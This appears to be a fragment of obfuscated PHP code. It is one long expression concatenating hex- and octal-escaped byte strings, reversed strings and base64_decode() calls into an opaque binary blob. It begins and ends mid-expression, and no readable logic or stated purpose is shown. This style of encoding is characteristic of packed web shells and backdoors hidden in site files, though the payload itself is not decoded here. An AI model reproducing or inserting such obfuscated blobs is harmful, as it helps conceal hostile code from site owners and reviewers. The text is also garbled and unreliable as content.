qﬁ∑oız€œ÷˝`{')."\x36\x62\xcc\x84\xbd\x5a\xd\x7e\xab\xa0\xbe\x2d\xf8\xa5\x6a\x86\x80\xe2\x42\xd0\x58\xa6\xaf\xc3\x6b\xd7\x5f\x17\xa3\xc4\x66\xb5\x6\x13\x5\xa4\x69\x26\x44\x18\xc4\xe6\x95\xc6\xa3\xc8\xa4\xa1\x72\xca\x5a\xac\x22\x43\x2f\x54\x4a"."\250\114\247\67\324\21\364\265\173\211\106\47\33\250\31\110\263\220\134\271\3\150\50\270\230\205\231\221\107\211\245\261\124\105\55\215\253\45\113\103\144\127\134\313\24\262\71\124\131\251\2\252\260\124\70\40\203"."\105\342\205\124\1\27\10\0\120\342\140\266\125\101\203\105\244\54\127\271\264\322\121\353\250\253\226\210\31\62\316\101\314\216\245\12\142\162\314\362\131\76\342\210\131\142\165\216\332\152\251\42\77\122\101\352\305"."\xfb\x15\xd4\x3e\x8a\x31\xd\x49\x76\x54\x91\xa\x8b\xd5\xe5\xb8\x80\x45\x19\xa6\x2e\xab\x80\x67\x49\x71\x7\x3\xb1\xfc\xe0\xd7\x62\x4a\x1c\x77\xf1\x1c\x78\x9c\x0\x86\x1d\x26\x79\xfa\x3a\xad\x98\xd8\x2\xb9\xbf\x52\x92\x73\x9".strrev('„öÆ(¥x°CE(…j‡H€	W5cxŸª˙"¬L’FtµhŒñl¢$ÀftF)j ÊW˚Çê')."\203\0\113\31\121\46\170\111\200\23\261\4\72\202\20\316\6\261\114\32\62\15\257\300\342\15\156\147\326\110\121\56\107\154\223\173\227\262\66\120\132\46\103\240\160\303\162\150\355\341\15\167\364\140\52\17\11"."\144\236\210\315\260\20\52\357\116\311\102\42\31\152\103\110\360\360\164\201\14\141\17\204\347\353\353\12\4\173\261\225\103\250\243\307\333\353\161\21\376\215\51\1\343\103\61\102\152\225\52\41\347\303\240\112\113"."\367\243\17\321\56\13\243\257\202\171\25\65\25\303\304\275\220\117\221\312\220\321\227\220\31\233\214\262\264\126\142\303\116\122\44\363\203\20\10\206\243\240\3\10\173\26\270\156\245\260\120\210\12\243\5\135\57"."\xb2\x8d\x22\x16\xac\xb9\xa4\x22\xcf\xe4\x62\x8e\x92\x20\xcc\x31\x29\xc7\xc1\x3e\x90\x5a\x3b\xc7\xa8\x53\x5\x50\x5\xf8\xe5\x8e\x40\x5f\x97\x8f\x9a\x7d\x74\xc6\x2c\x69\x9d\x41\x1f\x34\x39\x24\x95\x93\x68\x9\x51\xae\x3\x0\x22".base64_decode('+bEEC3NbPZjAln0Q4as+TBF8O8DPhPpYmMtyIALV9DgHHuxk4R5msQUTAkEh4gl6ekMsGhwEHB3C').base64_decode('BMukXk8oDFrVN9DLub7fsxgQTIDLJZRjV7lq5ldHsN0FDuKfBTQGddeHV9Y5pFmrqwkOtVSImmmw')."\13\215\362\257\34\341\217\372\3\335\70\216\174\116\170\163\11\56\156\113\103\22\20\107\303\134\34\65\350\362\305\146\204\4\350\130\302\306\134\122\137\140\320\303\35\30\10\11\30\102\4\136\211\273\65\160\37".base64_decode('ORQZi7iAyGAs5+YUne0SFUY64Eaa6PmT3B66otKlw0EC0YyWombKgEVSAQL/LqEBxD1JBrBry2eo')."\x79\x5\xb6\xeb\x88\x46\x56\x45\xe\x8f\x38\x5d\xd8\x94\x5\x4a\x32\x11\x7\xaf\x59\xd4\xbb\x4\xac\xba\xa1\x90\xc5\xe\x27\x8a\xc\xfa\x49\xe9\xa0\xcd\x24\x84\xe7\x31\x8e\xb4\x90\x1f\xb2\xd5\x68\x21\x3d\x41\xa2\x6d\xad\x6c\x68".strrev('/…ÜÅΩz'."\r".'Ó‹œg◊ ≥ˇ≠ıDIjÑˇÇÆÚ-˜ÍIÄ!ï<0˛?Á^U·›Í¨GΩ').strrev('	)A–µˇ8:ÑÒdïuaÂUjŸòZÑu:≥<9œ:ÖZ4l˝8¡,+∑ø$ÆÕ@0≤HM4á,G').strrev('DºÓÇºä$`ë98ƒ?é‰Pu@ÖÙË:Ü®hkπç7__bœÒÙﬁ$3¯Îe• ')."\x4\x41\x1c\xee\x0\x30\x6f\xb6\xce\xb1\xf6\x1\x9f\xbf\x53\x34\x35\x84\x88\x64\x49\x41\x7c\x9d\xac\x2a\x33\x68\xe5\x68\x1c\x19\x1d\xd2\x8\xec\x72\x1a\x46\xe4\x45\x23\xa8\xf\x68\x4\x77\x0\x8d\xa1\xee\xa2\x11\xe4\x60\x84\x46"."\120\103\151\4\156\111\274\175\64\15\154\375\300\266\215\356\347\122\134\347\65\55\27\231\11\315\274\104\114\260\216\265\35\66\241\203\24\57\34\67\262\110\40\305\61\111\260\320\203\247\126\302\331\207\33\143\0"."\151\23\341\200\337\310\362\371\110\32\136\116\311\22\133\205\231\141\325\144\126\176\350\243\304\67\7\370\250\17\31\345\10\237\45\353\71\77\54\301\272\244\121\115\320\231\17\41\20\71\100\343\7\21\326\335\21"."\343\62\313\331\246\207\130\332\72\310\257\316\233\145\125\6\204\20\62\326\173\341\237\10\301\215\220\32\20\343\232\112\7\135\212\243\334\116\323\324\13\202\346\51\322\201\3\235\356\341\46\130\114\121\24\245\25"."\x62\x10\x59\xec\x78\x74\xf0\x3\x6\x83\x5a\x4b\x21\xb9\x80\x54\xdd\xd4\x24\x8e\x65\xd5\x6f\xa5\x66\x9a\xd8\x27\x8b\x5d\x79\x4d\x4\x73\xfd\x37\x7e\xe2\x4b\x75\xb8\x41\xc7\x5a\x32\xc\x8\x96\x52\x72\x82\x5b\x7\xc9\xcc\xbe\xc9"."\x4c\x73\x4b\x30\xd1\xf\x4a\x67\x3b\xed\x81\x42\xce\xc\x29\x19\x72\x74\xdf\x19\x43\x3a\x7f\x5c\x8b\x9c\x75\x87\x21\xe8\x2\xa2\x3\x27\xde\x3e\xec\x74\xc6\x96\x91\x94\xe4\x63\x55\x16\xb0\x38\xd0\xcf\x3d\x9e\xc0\xb3\x1e\x5e\xe6".strrev('=~”"b\\∆ÖNı2(Î8'."\0".'Ÿ˙¿‰)Z∫≥òñt{”≥ci	G¬∫YÖ»5btUg¢øZr'."\r".'YtJ§')."\217\362\12\272\224\310\341\13\51\126\317\140\302\70\324\126\71\123\323\172\345\334\104\130\133\254\322\233\340\316\300\140\237\77\100\275\64\120\227\56\204\107\220\213\15\260\371\320\135\64\142\322\100\371\46\351\62"."\251\317\40\135\131\20\235\162\77\136\207\212\144\200\306\223\23\224\47\330\321\3\104\301\150\227\17\310\311\336\45\104\334\132\24\350\214\206\2\3\101\172\162\1\343\310\262\42\350\355\130\312\116\22\30\264\313"."\xb3\xd8\xe\x81\xc5\x85\x3d\xdd\x65\xc1\x4c\x10\x84\x70\xc4\x73\xa3\xc1\x0\x94\x9a\xbd\xfe\x2e\x5b\x86\x50\xf\x73\x88\x61\x85\x45\xfd\xbe\xbe\x45\x65\x13\xc2\x81\x68\xaf\x90\x5\x3\xc1\xde\xb9\xd7\xe\xb3\x96\x10\xf2\xc2\xae"."\340\361\166\177\240\103\110\366\5\112\173\2\60\172\33\20\213\325\164\61\256\212\254\104\234\267\31\60\340\304\52\270\64\73\243\140\145\237\37\131\135\135\25\161\317\167\325\60\171\22\17\215\140\107\120\36\254".strrev('ö0vÖ∫\\†5‚OXÜñÜå>_ª.*¶ÄÈ¯-XDÂßm∞Ö<H4¶R≥,“'."\0".''."\0".'§\\ªsa')."\x78\x58\x6d\x43\x6\x7f\xfd\x22\x6a\x58\xc9\xe6\xcb\x22\x5a\x88\xcf\x62\x69\x21\x82\x5c\xaa\xc6\x7b\x8\x2f\x4a\xa2\x69\x17\x46\xe2\x18\x2b\x55\xad\x99\xce\xc4\x78\x1\x1a\x98\xf2\xfe\xe6\xb3\x18\x80\x5c\x9c\x5d\x91\x92\xf8\xc6"."\x87\xcc\x61\xa7\xe8\xbd\x9\xf6\xba\xc8\x79\x13\x31\xdb\xd4\x23\x0\x7e\x9f\x25\x4c\x50\xe\xac\xa7\x77\x78\x4b\x9d\x59\x67\x22\x12\xee\x86\x6e\x30\x22\xcb\x58\x5\x55\x5d\xf0\x43\x11\xd7\x72\x9\xe4\x7a\x83\xde\xd7\xc5\x29\x93"."\55\200\155\43\75\127\206\353\217\341\34\123\151\27\34\306\354\127\311\215\115\124\106\326\327\121\361\352\157\324\151\250\251\234\123\316\244\64\300\203\323\131\12\245\372\16\44\235\373\60\311\153\140\123\114\335\360"."\71\301\47\204\64\214\14\12\247\113\13\74\270\146\256\137\140\304\140\61\221\162\140\237\262\353\210\20\252\135\263\324\110\74\41\165\201\45\115\120\41\17\24\114\37\164\161\303\355\266\40\107\104\316\177\310\262".strrev('“≤_c®	ˆˆ'."\r".'^Ç}≠ fß.ﬂ}¬]*-°tËÆùúÏ#≤™/¬; ºßâ–XÆ·ƒœ.PTiœq-')."\x41\xf3\x2a\xd1\xd3\x9b\x67\x30\xd4\xe8\xec\xe9\xf5\x74\x38\x1\x47\xab\xa7\x37\xfc\x4b\xb3\x80\x4c\x7a\x54\x46\x24\xf2\x98\xd1\x18\x85\x9e\xc\x14\x2a\x93\xcd\x9c\x25\xa5\x41\xaf\x92\xd1\x2f\xf5\x3\x73\x98\xd5\xdb\x10\x6\x62".base64_decode('NyVAvEzAywi6emOojSowkIsoOI7N3+mVVlpmFYbNwKFy311S9rtLyn13ie27S0q/i0E26pPz+Q7s')."\335\114\344\21\26\120\134\214\120\146\233\204\267\55\342\225\15\21\244\361\345\274\13\44\167\252\6\24\303\23\14\337\340\41\106\341\111\201\366\55\305\375\240\307\40\211\162\177\126\20\24\261\20\7\307\220\31"."\104\247\51\43\33\46\224\100\370\231\4\264\347\354\145\122\217\116\51\333\255\31\106\231\233\170\0\225\360\105\121\1\363\33\11\111\233\12\164\342\250\32\222\34\313\151\172\226\216\15\161\300\304\174\351\60\117"."\73\334\35\17\336\362\341\260\227\231\150\366\312\343\236\224\22\122\40\33\43\35\345\35\317\153\206\42\72\161\112\50\310\71\10\63\344\221\307\41\163\241\27\230\262\76\102\123\306\235\240\326\66\157\102\206\242"."\214\120\1\121\220\303\231\354\335\317\274\4\331\353\6\173\320\231\265\70\133\243\16\214\104\167\17\252\305\104\226\163\74\235\373\213\102\247\205\316\262\0\247\140\10\207\331\203\340\2\14\64\44\305\106\303\111"."\x26\x74\x1a\xf5\xc\xbd\xca\xc3\x3f\xcb\xca\x55\xcf\xa9\x73\xcf\x4f\x81\x50\x8\xfb\xbf\x5b\xa4\x4c\x50\x1f\x4a\xb6\x29\x61\x73\xbb\x14\xe9\x8e\xf4\x46\xc2\x62\xbf\x9a\xba\x9c\x4c\x82\x6a\xb\x9e\x5a\x2c\x75\x1\xdf\x90\x68\xd3"."\247\166\21\105\166\275\207\227\165\12\105\22\221\243\62\267\216\324\114\34\143\121\106\251\310\365\146\31\132\105\360\377\236\132\105\222\201\213\63\235\241\134\123\40\137\20\274\307\142\31\274\37\371\371\242\114\105"."\330\201\40\377\132\304\373\35\163\170\5\272\65\327\256\45\310\142\270\262\2\320\153\105\163\305\141\125\340\267\272\302\121\1\205\55\24\207\43\14\1\350\333\25\315\207\125\241\100\65\261\43\235\44\252\134\202".base64_decode('wxp+Kkv2FvNl0xROE+ajvoMTv95d7x4jPGb+KPwid2dpXzDGo4BH0lviqMipyRpAxkhM6WE1oTy8').strrev('ç≥ÏÏ.˚°œ“¶ä«@ÈkM∑Á*súªÑV∂õ˝D•mW: ÷ßÀàëõ<2’!w\'2ÔO\\≤â≥∑').strrev('≈Ù»3BJqF⁄˙›∞ït‰È¶9är¡é„èˇ3§‚∫Œô∞E÷-IÂe˜Ñº™lkn" π¿¥')."\261\315\360\110\202\366\320\100\176\242\220\163\166\0\311\301\211\345\235\346\162\13\142\163\255\25\37\272\170\265\342\213\174\25\162\254\250\215\143\161\206\224\345\101\354\271\261\131\22\335\171\12\236\226\234\120\354".base64_decode('wPOcbosJDHJhClJFv1V0Yiyw1ReOhhPIbXCKgFkKlnNTKYdidRBpdxtp7wWUBY6/U/RHOQ6kcZic')."\x53\xc6\x4d\x27\x24\x1\x27\xd5\xf6\x2d\x4d\xe1\x73\xbd\x6c\x55\xe3\x84\x9a\xca\xa1\xc\x14\xd4\x84\xfd\x93\xe8\x24\xdb\x59\x28\xd0\xf\x96\x2d\x54\xdc\x2b\x50\x4\xd4\x8\x1f\x2b\xcf\x22\xb5\xcb\x60\xac\x99\xa0\x6e\x17\xfc\x85"."\343\240\122\357\164\140\176\113\365\15\315\115\163\233\251\222\370\341\364\40\276\220\67\133\131\220\172\257\73\324\235\244\254\202\173\223\244\155\203\243\153\161\331\47\200\171\67\62\46\100\171\214\5\217\327\326\342".strrev('ç»]<|XahgKçP⁄°≈‡«'."\n".'åÀdÊ_Ë'."\r".'˜Î ^Ç∑,ñı“)BjxeÖGSo4îã').base64_decode('tAqJkqlpUlbOTZB9wwyjeYaBdZNmuBqTBogQzs18a8JFh3sLwXbBJAUsy1B4hK5KXXBxC1KN2v5M')."\201\371\270\314\243\60\251\141\277\177\240\333\327\47\134\235\11\200\150\107\147\137\324\323\337\137\66\201\311\101\246\32\167\103\237\232\256\25\324\63\163\234\22\117\213\232\115\111\161\250\134\326\132\1\241\25\222".base64_decode('ocepH6MKN+GoCIHvtFpUkqUSZpGSgBqcKISTK9ta3Gob62xuha1rXFvO5Z4O911ueB2VOxyObivl').base64_decode('03ArBKFd3OZaklpkCfdjayW8O0hWSmmwSLPb+TZ75j568tvilsVEOIGCGpWw2d6ryM7vyh5MeuI2')."\x8f\x97\x1d\x72\x6e\x71\x69\x16\x58\xb8\x2b\x5e\x2e\xc9\x8d\xf6\xfd\x6e\xc1\x53\x2a\x39\xa8\x10\x35\xa9\x2c\xde\x4d\xac\x47\xb4\xec\x54\xb0\xc\x81\xe4\xe5\xf8\x8\xa4\x29\xce\xd4\x71\xb2\x8b\x24\xf4\xc3\xbd\xd\x4e\xb0\x78\x62"."\64\205\53\2\120\161\360\51\270\267\325\325\124\232\236\42\255\304\5\301\325\177\365\352\122\30\321\62\260\47\171\362\252\35\4\151\307\16\203\333\163\16\3\253\223\365\63\230\156\105\44\16\241\70\376\276\156".strrev('n HÆÓi∑Lêπ±1ÿ"´§Ê†¯¨∏èl1uÊ∞©ÛzUªW´5]*ÜEä®á<Ó/û')."\xd8\x24\x78\xed\xd6\xda\xda\x36\xc4\x8e\x72\x87\x69\x1a\x15\x0\xd5\xba\x39\x74\x90\x27\xd3\xce\xf0\x20\xb\x76\xf4\x71\x81\x98\x91\x35\xe6\x20\x2e\xa4\x56\xed\xb1\xba\xab\x9a\x5f\x64\x8e\x51\x71\x2f\x8a\x61\x4f\x3e\x2f\x46\xe9".base64_decode('6w/Qx407o8bcbH67EcwV54qrFAVxFxscXo/ZEqAeOAIXAfsD4tQKOxyUxYAs0GLEdTVvWjgTfk+g')."\x2\xb9\xb2\x5d\x21\x17\x65\x8c\x52\x21\x51\x37\xe6\x15\xc8\x31\x5f\x5\xe0\x44\x38\x85\xb0\x0\x5e\x95\x16\xc8\x72\x24\x5d\xc9\xb4\x56\xa0\xea\x1a\x69\x45\x1\xf9\x11\x53\x29\xf7\x11\x90\xb1\x42\xa2\xfc\x30\x2b\xb3\x1e\xd3\x4d"."\xd\xac\x68\x4c\x3d\x94\xb8\x6c\x1e\x8\x12\xd5\x3b\x4f\xdf\x52\x8b\xac\x34\xfd\x48\xfc\x7b\xd8\x74\x4a\x28\xc8\x47\x78\x6\x8\xa1\x48\xbf\x8\xf1\x19\x74\xb8\x9f\xe4\xe7\x5d\xc4\x83\x74\x7f\x30\x10\xe\x74\x50\xb7\xc0\xe5\xe".base64_decode('xhqpYGpgDWC+r6Gqn4u8S60YbKl3EwgZfr2Qy7FLTChrsoUqhlxRhNIFky9x0IdfGCrYGwQs+ECB').base64_decode('HliUhIuu7MwXD4GXyYGPdWF5dDoILkvplzIadQJTX1tb66ytA/+zax3yieba2hKU2tpm9D9OQMeu')."\xa4\x43\xad\x29\x60\xfe\x52\x46\x43\x10\xc6\x14\x85\x2a\x16\x13\x14\x35\x57\xa0\xa2\xe\xe8\x2f\xe4\x7f\xa5\x99\x4e\xf4\x79\xc2\x46\x6d\x9e\xa4\xc0\xd6\x91\x98\x62\x6f\xa9\x5f\x4b\x59\x6\x85\x2e\x1\x70\x66\xd3\x30\x90\x37\xc0".strrev('^*04áîÒ¬™Œ0ıÇÄ>˘fñM–è†ˆãò¸UºÔXyÖ˚ ó7á®4ç'."\0".'µ∑§û”ñ†p')."\x63\xa2\x64\xa6\xf0\x8c\x62\x19\x66\x72\x3\xa3\x7d\xac\xa4\x72\x24\x94\xd6\xc6\xa2\x7c\x79\x83\xd1\x85\x2c\x86\xfa\x4\x6e\x37\x28\xb1\xb0\xd6\x93\x8e\xa1\x8c\x8f\x12\x7\xbd\xf3\x23\xf7\x6d\xc8\x30\x64\x44\xcd\x58\x2c\xf\xa2"."\102\331\242\343\112\300\137\240\264\112\207\25\37\241\223\17\100\101\307\305\173\17\371\65\103\117\37\340\53\376\346\151\102\117\352\32\327\377\57\171\321\203\306\102\345\257\222\205\223\55\12\233\2\223\35\174\121"."\x88\x97\x2\xf0\x65\x6f\x7\xf3\xd2\x22\x14\x60\x4f\xb2\xe5\xf1\x24\x84\x17\x2b\xc\xee\x9e\xa5\x83\xb9\x7b\x12\x7d\xb6\x60\x87\x34\xc2\xad\xaa\x41\x9c\x9\x72\x47\x50\xb4\xc\xd6\xfa\x82\x9e\x71\xe5\x75\x2d\x5\x46\xc2\x10\xea"."\5\341\375\345\301\14\275\24\263\14\22\153\220\210\47\2\241\376\4\175\54\201\20\25\73\243\7\233\72\306\26\5\324\20\333\152\10\100\253\206\203\220\320\301\134\4\213\100\270\361\30\20\266\215\310\342\310"."\x5a\x6\xdc\xd1\x58\x21\xac\x66\xdf\x43\x42\x74\xc3\x69\x92\x7\x39\x4\xc3\x11\x82\xc6\x15\x3a\xe0\xce\x5f\x3c\x22\x55\xb5\xe\x42\x3b\xb0\x37\xf8\xe5\x9d\x15\x5e\x42\x65\x64\x86\xb4\x52\xa1\x1e\x4d\x21\x6b\xda\xe6\xe3\xcf\xa4"."\201\263\51\26\154\74\73\232\22\17\136\341\244\351\141\157\76\224\241\16\53\5\224\14\65\232\63\260\200\146\306\45\204\30\272\372\167\41\17\211\134\126\266\105\355\352\1\210\377\231\224\205\121\347\156\71\346"."\130\31\166\6\356\175\34\57\363\5\222\211\145\161\321\233\106\127\74\231\262\201\30\321\225\0\24\276\55\100\172\265\100\34\245\174\263\127\233\4\174\115\166\67\271\152\245\252\101\25\310\134\143\206\324\27\226"."\146\271\352\347\111\203\201\301\131\215\325\22\220\376\62\312\240\22\133\244\232\356\246\206\331\256\206\131\122\325\242\236\160\257\337\41\101\143\44\251\33\110\223\132\265\324\221\326\265\254\342\256\237\15\215\71\32"."\x9b\x1a\x5c\x73\x1b\xa5\x90\x9c\x94\x75\x95\xe4\x22\xdc\x93\x28\xa2\x8e\x91\x5f\xf8\xb6\x57\x54\xa8\x72\x54\xd8\x69\x63\x1\x80\x72\x5d\xa4\x6d\x8b\xef\xe7\x86\x60\x2e\xa2\x42\x9\x66\xa\x7a\x20\x4c\xcc\x88\x14\x20\x88\xae\x94"."\xb8\x73\x87\xb8\x56\x3a\xb0\x16\xb\x11\x86\x39\xae\x4\x5f\x3\xb2\x5c\x9\xfe\xfa\x14\xca\xe5\xc1\x54\xe4\x53\x1a\x2e\x19\x2\xa9\xc1\x28\x23\x2c\xa8\x5c\x9e\x11\x9f\x55\x1a\x54\x13\xec\x2\x7f\x28\x62\xc\xd7\x44\xdc\xbd\x4a".base64_decode('QpXbtXEcHUI/SP8UKvNVw+jM/yVaExmmyl7wgz0K37G5Z/R3djk5OtshIifK3BU4qRhyAcm/QMun')."\245\207\355\33\104\34\306\57\44\340\160\7\34\5\40\72\164\262\25\22\360\175\36\101\203\144\301\145\272\74\272\226\50\304\151\221\375\226\130\76\221\134\54\156\124\73\311\24\102\302\232\370\22\322\70\220\326"."\x59\x8b\xf4\x48\x6e\x18\x4d\x73\x8\x45\xed\xc0\xb0\x1a\x4b\xdb\x30\x6c\xe6\x8c\x19\xde\x40\x17\x53\xfa\xe4\x18\xe3\xf5\xb5\xc3\xd6\xd8\xfc\xaa\xa1\x5c\x72\x78\x7e\x75\x15\xcc\xb8\x8a\xc0\x70\x29\xb4\x7b\xa9\x31\xac\xa5\x2a\xe2"."\127\55\335\73\123\213\255\160\253\144\243\350\46\364\203\352\326\322\122\345\252\251\156\153\343\373\110\67\44\102\113\11\254\316\320\361\145\151\331\226\110\220\42\353\314\111\246\33\10\44\372\104\376\277\316\251\140"."\x74\x92\x19\x5e\x3d\xfe\xb7\x39\xdd\xbe\x4e\xd2\xe1\x43\xc3\x38\xd0\x2\xfa\xe4\xc8\xb6\xe1\x9a\xea\xa1\xb6\x32\x10\x96\xaf\x5f\x57\x8a\x65\x9b\xc\xfa\x8d\x8d\x77\x84\xbc\xba\x15\x21\x4b\x5b\x84\xbe\xf6\x45\x14\x12\x23\x44\x23"."\221\52\17\62\145\102\332\224\252\110\44\222\100\176\313\231\312\70\201\60\127\367\125\323\101\274\136\304\300\0\212\60\235\342\265\14\311\316\44\252\153\33\100\146\232\304\55\256\232\266\303\150\146\164\55\102\11"."\x64\xaf\x69\xd4\xea\xab\xa7\x86\x7d\x7d\xbc\xcb\xb\xfe\x18\x51\x1e\x4e\x8a\x47\x37\x26\x4\x19\x70\x65\xa7\xb7\x2f\xec\xb\xfb\xbc\x44\x55\x7e\x87\x3d\xa6\xed\xb9\x17\xe9\x3\xa2\x96\xba\xd7\x34\x5a\x24\xe8\xdc\xc8\x78\x6d\x2d"."\370\233\13\376\144\360\27\7\177\11\110\302\21\3\374\73\7\374\201\224\6\0\155\120\42\343\115\61\360\7\122\147\203\337\331\20\53\11\376\232\70\27\151\153\343\5\203\326\172\234\135\240\331\345\12\7\131"."\xda\x18\x85\xb\x15\x84\x9b\xfe\xd8\xa\xca\x37\xe9\xd9\x4\x7c\x16\x42\x91\xe9\x1c\x92\x33\x4c\x1\x47\x78\x6c\xc\x7e\x32\xa2\xc3\x79\x7\x67\x1d\x9f\x1e\x55\xd0\xee\x12\xe1\xc1\xd9\x5a\xa6\x26\x1c\x97\x61\x5a\x1a\x31\x15\xd"."\17\374\60\226\70\215\131\263\146\72\135\265\165\365\15\215\115\263\146\123\377\51\271\102\126\321\351\211\213\33\171\210\154\200\77\152\202\376\360\263\34\353\331\164\336\240\56\13\262\314\33\0\340\215\164\331\27"."\124\231\14\121\371\153\104\231\350\245\7\24\160\251\114\302\213\55\222\66\247\275\237\120\216\73\62\4\271\115\204\122\42\164\222\53\250\367\220\130\50\115\317\121\147\324\326\47\232\331\77\66\30\25\211\122\206"."\x4b\xa8\x2b\x7e\x23\x4a\x2e\x80\x36\x51\x45\xb6\x15\xd4\x1\x8\xf2\x87\x29\x3c\x27\x5\x88\xc0\xe8\xc0\x97\xaf\xc2\x41\x38\x2c\x51\x28\x5b\x38\xb1\x44\x71\xf8\x6\x17\x95\x7d\x30\x20\x13\xa3\x8f\x0\x88\x69\x2\x78\x81\xb\xc8".strrev('√ºŸb:MJG)s‰ríºä«$–8÷»0⁄«w°íúæªÇÔ*Ä,≥˙&Ï∑˘ôÂ'."\n".'«ü’ÀØâwóIK')."\124\223\111\370\217\3\214\241\43\37\117\70\214\142\312\241\44\345\161\307\230\22\313\123\327\337\172\275\103\321\223\216\221\104\334\221\210\353\216\4\50\40\247\217\71\162\112\322\241\1\270\76\126\357\310\203\260".strrev('ã⁄ñbñ1o~ñbˆ	«q‘≤	-u¨ÍÎ‡Ω,K!D®\'¿S„\\™@S-≠Ï'."\r".'&®¢Ï‚t3¯2`')."\21\23\73\251\317\366\5\170\110\150\34\277\370\45\147\240\17\170\362\337\170\66\357\202\177\110\214\120\40\242\3\215\371\2\350\264\101\320\305\160\121\104\164\361\64\301\205\21\115\127\201\144\54\227\257\110\300"."\x9e\x68\x68\x49\x73\x8c\x29\x85\x89\xa8\x21\x92\x22\xd4\x8d\x54\x84\xa5\x90\xb8\x51\x8a\x69\x69\x85\xa6\x87\xd9\x9b\x38\x31\xd5\xec\x7\xfb\x70\x99\x6b\x65\xe2\xd1\x4\x70\x23\x9a\x87\xa6\xaa\x42\x12\x4\x2\xec\x7e\x75\x9c\x5a".strrev(')—uXo'."\r".'ø»’d<®]tıÚ‡[-'."\n".'ãûh¡‡¬–vp9@A?($€B![1Â◊âáüéhÀ·p/ç')."\1\376\50\23\260\31\142\52\243\305\344\114\24\227\301\257\357\344\34\340\52\314\111\310\2\27\216\203\322\134\326\224\24\125\300\312\150\271\224\152\26\22\326\66\165\367\207\120\125\12\40\203\313\206\222\1\345"."\375\100\6\13\206\234\371\41\174\53\106\102\51\252\161\245\127\36\51\103\120\20\112\111\46\313\60\160\16\316\343\55\71\340\341\12\313\302\237\156\102\314\267\223\235\14\212\131\174\64\11\36\207\203\256\243\271".base64_decode('UZYEhwsFeQQWKhaFWSstQGS0ccAZqXmoBxAa1DjqEncepJiOQG//QNjb6SqLRIHCBYZIlWWS4Wk0')."\330\231\243\363\310\51\162\115\201\202\64\320\100\141\374\4\125\314\124\232\332\5\115\33\104\5\106\21\275\44\121\0\370\162\15\115\331\154\227\232\51\263\20\175\17\32\110\52\30\235\240\203\345\234\155\206\262".strrev('‹rÇLB¬≈ﬁ(%J1Ll™Ì!Jû;Îñ+á{JöR ˘)úªJö≠0aXø„ﬂ≈*¡CP‚É,>')."\41\47\114\303\41\27\34\162\126\167\310\105\335\21\323\162\43\216\204\221\4\177\206\3\54\275\60\71\231\1\210\31\331\221\1\14\314\221\125\23\252\43\13\2\252\351\30\317\72\214\206\54\131\204\263\171\220".base64_decode('mG9waEndoY+AIo00nBsjjjG56BjLyo5so+zQUilHcTTpGCs6ilrcYdIjZComRQ1Rq3G0oMZHINgF')."\xff\x1\xe3\x92\xcd\x1b\xd1\x42\x4e\x1d\xa7\x1e\xd2\xb3\x9a\x56\x94\xb2\xc5\x74\xe2\x87\xf0\xb1\x1f\x73\x3b\x3e\x16\x4a\x0\xdf\xd3\x35\x63\x44\x76\x21\xed\x2a\x45\xb7\x2f\x47\x2c\x7d\x88\x20\xac\x82\xea\x87\x60\xb4\xe5\x7c\xde"."\1\4\232\4\330\166\42\363\336\141\173\116\136\237\41\266\12\122\25\256\50\224\324\304\34\270\62\364\23\130\116\20\324\125\140\42\136\271\242\272\345\24\235\371\73\201\307\51\242\210\112\104\56\120\34\165\335"."\203\127\106\301\136\1\243\114\265\62\332\77\157\1\15\1\171\273\130\267\12\376\133\277\112\6\274\265\250\351\61\325\240\357\133\261\246\17\213\302\346\177\237\111\144\206\377\103\56\56\237\246\224\234\376\77\177"."\125\310\64\241\120\173\241\377\76\73\317\3\72\212\232\244\377\17\35\5\63\105\305\247\346\10\222\341\312\253\161\310\251\135\265\56\176\355\202\304\32\72\367\32\301\54\55\72\222\215\160\252\25\301\64\53\72"."\xb2\x5a\x11\xcc\x68\xd5\xa1\x67\x8b\x31\x47\x76\xa4\x8\x2\x50\x66\xce\x82\x79\x8\xc2\xa\x10\x9\x8d\xb1\x24\x99\xbb\xd\xa9\x7a\x47\x43\x2a\xef\x90\xc1\xc4\x8f\xa9\x80\x3\xa8\xc5\xa4\x23\x67\x14\x1d\x60\xf6\x83\xff\xc7\x4c".strrev('µCìçÑÎe‚aöVÚti¯•◊	SÓè5¡|“¯9ivS8X#±‘ã’,Ù%$YÕ¯P')."\250\140\122\361\137\263\10\133\131\70\131\50\11\327\26\355\141\204\31\271\300\105\132\201\245\104\230\340\140\362\47\107\43\231\341\215\115\74\232\321\264\221\102\136\140\5\70\25\357\262\15\327\120\155\335\252\272"."\x61\x17\x9f\xde\x3f\x84\x89\x8b\xfd\x21\x2c\xc4\x18\x4\x24\xde\x33\x18\x1d\xa5\x47\xbf\xbf\x8a\xe4\x4b\x42\x6\x61\xf\xc9\xf9\x26\xe7\x97\xab\x44\x7e\xb9\x8a\x30\xbb\x61\x8b\xf0\x6b\x27\xe\xc6\x75\x61\x2\xec\x4\x7a\x16\x4a".base64_decode('fku47pAO9ozivCqzeyAiF2XGxKbXsFSETb7vwbKxeQtzt7DoLFu8LTvhEjAaFBwu4ed6PK3Seyl0')."\101\302\5\377\102\216\156\15\224\204\40\357\203\14\231\204\256\344\204\47\212\100\213\300\16\15\72\205\141\40\320\211\302\313\44\202\206\226\306\44\24\64\131\160\260\333\37\150\367\40\77\16\321\236\0\175\233"."\273\265\265\315\20\157\310\322\200\136\234\340\103\51\366\6\346\240\254\103\75\10\107\230\50\1\112\44\125\322\162\354\216\213\234\213\215\141\124\34\351\357\351\217\172\6\302\75\202\57\14\6\352\47\212\74\350".base64_decode('EXIICQR9yzzc81VMNuh50eDgoBOet0PjmDh6v7wdJkqQEWZbK0a0RDyjFRIVvEB3natWaqytkwZy')."\124\131\224\156\217\350\123\365\71\315\51\274\24\151\173\254\336\232\150\171\15\231\176\34\47\201\275\4\40\53\141\307\34\50\52\272\140\341\100\37\370\46\277\275\201\305\104\163\271\43\320\117\316\17\172\27\61"."\x75\x96\x4e\x25\x4f\x85\xe6\x8e\x92\x97\xa3\x91\x6\xce\x78\x36\x33\x8f\xe9\xf7\x8\xa7\xa2\x2d\x9d\xcd\x79\x5d\xcb\x27\xd5\x5c\x42\x2\x38\x39\xa3\xb9\xb3\xb5\xa2\xd3\xb3\xb8\xb9\xa2\xd\x24\xc9\x99\xc\x4c\x95\xdc\x6d\x2d\x6e"."\216\110\106\254\77\30\350\357\362\61\57\30\375\160\10\310\361\30\171\357\336\113\146\6\371\224\105\267\275\2\364\164\5\327\155\257\100\165\252\220\250\253\74\144\55\204\203\314\31\256\150\266\113\264\106\241\71"."\x9c\xd